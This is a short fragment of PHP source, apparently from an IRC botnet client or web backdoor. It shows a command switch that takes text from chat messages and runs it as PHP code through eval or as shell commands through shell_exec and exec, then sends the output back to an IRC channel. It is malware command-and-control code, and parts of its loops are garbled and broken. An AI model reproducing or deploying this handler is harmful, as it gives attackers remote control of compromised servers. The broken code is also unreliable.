case "rndnick": $this->set_nick(); break; case "raw": $this->send(strstr($msg,$mcmd[1])); break; case "eval": $eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1]))); break; case "sexec": $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); $exec = shell_exec($command); $ret = explode("\n",$exec); for($i=0;$iprivmsg($this->config['chan']," : ".trim($ret[$i])); break; case "exec": $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1); $exec = exec($command); $ret = explode("\n",$exec); for($i=0;$iprivmsg($this->config['chan']," : ".trim($ret[$i])); break; case "passthru": $command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
